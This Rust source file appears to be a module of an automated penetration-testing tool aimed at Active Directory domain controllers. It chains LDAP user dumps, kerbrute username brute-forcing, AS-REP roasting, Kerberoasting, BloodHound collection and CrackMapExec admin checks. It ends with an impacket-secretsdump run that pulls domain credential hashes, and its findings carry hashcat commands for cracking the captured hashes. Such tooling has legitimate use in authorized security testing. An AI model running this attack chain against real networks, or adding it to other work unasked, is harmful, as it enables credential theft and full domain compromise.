
use crate::engine::{Config, Finding, FindingSeverity};
use crate::engine::executor::{sh, avail};
use anyhow::Result;
use std::path::Path;

pub async fn run(target: &str, cfg: &Config, base: &Path) -> Result<Vec<Finding>> {
    let mut findings = Vec::new();
    let scans = base.join("scans");
    let domain = cfg.creds.domain();
    let user = cfg.creds.user();
    let pass = cfg.creds.pass();

    // LDAP anonymous enum
    if avail("ldapsearch") {
        let cmd_anon = format!(
            "ldapsearch -x -H ldap://{target} -b '' -s base '(objectclass=*)' namingContexts 2>/dev/null");
        let out = sh(&cmd_anon, &scans.join("ldap_base.txt"), 30).await.unwrap_or_default();
        if out.contains("namingContexts") || out.contains("DC=") {
            findings.push(Finding {
                severity: FindingSeverity::Medium,
                category: "ldap".into(),
                title: "LDAP anonymous bind successful — base DN leaked".into(),
                detail: out.lines()
                    .find(|l| l.contains("namingContexts") || l.contains("DC="))
                    .unwrap_or("").trim().to_string(),
                tool: "ldapsearch".into(),
            });
        }
        // Full user dump if creds available
        if cfg.creds.has_auth() {
            let base_dn: String = domain.split('.')
                .map(|p| format!("DC={}", p))
                .collect::<Vec<_>>().join(",");
            let cmd_auth = format!(
                "ldapsearch -x -H ldap://{target} -D '{user}@{domain}' -w '{pass}' \
                 -b '{base_dn}' '(objectClass=user)' sAMAccountName description memberOf 2>/dev/null");
            let out_auth = sh(&cmd_auth, &scans.join("ldap_users.txt"), 120).await.unwrap_or_default();
            let user_count = out_auth.lines().filter(|l| l.contains("sAMAccountName:")).count();
            if user_count > 0 {
                findings.push(Finding {
                    severity: FindingSeverity::Info,
                    category: "ldap-users".into(),
                    title: format!("LDAP: {} domain users enumerated", user_count),
                    detail: format!("Full list written to scans/ldap_users.txt"),
                    tool: "ldapsearch".into(),
                });
            }
        }
    }

    // Kerbrute — user enumeration (no creds needed)
    if avail("kerbrute") {
        let wl = "/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt";
        let cmd = format!("kerbrute userenum -d {domain} --dc {target} {wl} 2>/dev/null");
        let out = sh(&cmd, &scans.join("kerbrute_users.txt"), 120).await.unwrap_or_default();
        let valid: Vec<_> = out.lines().filter(|l| l.contains("VALID USERNAME")).collect();
        if !valid.is_empty() {
            findings.push(Finding {
                severity: FindingSeverity::High,
                category: "ad-users".into(),
                title: format!("Kerbrute found {} valid domain users", valid.len()),
                detail: valid[..valid.len().min(5)].join(", "),
                tool: "kerbrute".into(),
            });
        }
    }

    // AS-REP Roasting — no creds needed
    if avail("impacket-GetNPUsers") || avail("GetNPUsers.py") {
        let tool = if avail("impacket-GetNPUsers") {"impacket-GetNPUsers"} else {"GetNPUsers.py"};
        let cmd = format!("{tool} {domain}/ -dc-ip {target} -no-pass \
            -usersfile /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
            -outputfile {}/asrep.txt 2>/dev/null", scans.display());
        let out = sh(&cmd, &scans.join("asrep_roast_run.log"), 60).await.unwrap_or_default();
        if out.contains("$krb5asrep$") {
            findings.push(Finding {
                severity: FindingSeverity::Critical,
                category: "asrep-roast".into(),
                title: "AS-REP roastable accounts found — hashes saved to scans/asrep.txt".into(),
                detail: "Crack with: hashcat -m 18200 scans/asrep.txt /usr/share/wordlists/rockyou.txt".into(),
                tool: "GetNPUsers".into(),
            });
        }
    }

    // Kerberoasting — needs creds
    if cfg.creds.has_auth() {
        if avail("impacket-GetUserSPNs") || avail("GetUserSPNs.py") {
            let tool = if avail("impacket-GetUserSPNs") {"impacket-GetUserSPNs"} else {"GetUserSPNs.py"};
            let cmd = format!("{tool} {domain}/{user}:{pass} -dc-ip {target} \
                -outputfile {}/kerberoast.txt 2>/dev/null", scans.display());
            let out = sh(&cmd, &scans.join("kerberoast_run.log"), 60).await.unwrap_or_default();
            if out.contains("$krb5tgs$") {
                findings.push(Finding {
                    severity: FindingSeverity::Critical,
                    category: "kerberoast".into(),
                    title: "Kerberoastable SPNs found — hashes saved to scans/kerberoast.txt".into(),
                    detail: "Crack with: hashcat -m 13100 scans/kerberoast.txt /usr/share/wordlists/rockyou.txt".into(),
                    tool: "GetUserSPNs".into(),
                });
            }
        }

        // BloodHound ingestor
        if avail("bloodhound-python") {
            let cmd = format!("bloodhound-python -c All -u {user} -p '{pass}' -d {domain} \
                -ns {target} --zip -o {}/bloodhound/ 2>/dev/null", base.display());
            tokio::fs::create_dir_all(base.join("bloodhound")).await.ok();
            let out = sh(&cmd, &scans.join("bloodhound_run.log"), 300).await.unwrap_or_default();
            if out.contains("Done") || out.contains(".zip") {
                findings.push(Finding {
                    severity: FindingSeverity::Info,
                    category: "bloodhound".into(),
                    title: "BloodHound data collected — import ZIP into BloodHound CE".into(),
                    detail: format!("Output: {}/bloodhound/", base.display()),
                    tool: "bloodhound-python".into(),
                });
            }
        }

        // CrackMapExec — domain auth check
        if avail("crackmapexec") {
            let out = sh(
                &format!("crackmapexec smb {target} -u {user} -p '{pass}' -d {domain} --users 2>/dev/null"),
                &scans.join("cme_domain.txt"), 60
            ).await.unwrap_or_default();
            if out.contains("Pwn3d!") {
                findings.push(Finding {
                    severity: FindingSeverity::Critical,
                    category: "ad-auth".into(),
                    title: "Domain admin privileges on DC confirmed".into(),
                    detail: out.lines().find(|l| l.contains("Pwn3d!")).unwrap_or("").trim().to_string(),
                    tool: "crackmapexec".into(),
                });
            }
        }

        // impacket-secretsdump
        if avail("impacket-secretsdump") {
            sh(
                &format!("impacket-secretsdump {domain}/{user}:'{pass}'@{target} -just-dc 2>/dev/null"),
                &scans.join("secretsdump.txt"), 120
            ).await.ok();
        }
    }

    Ok(findings)
}
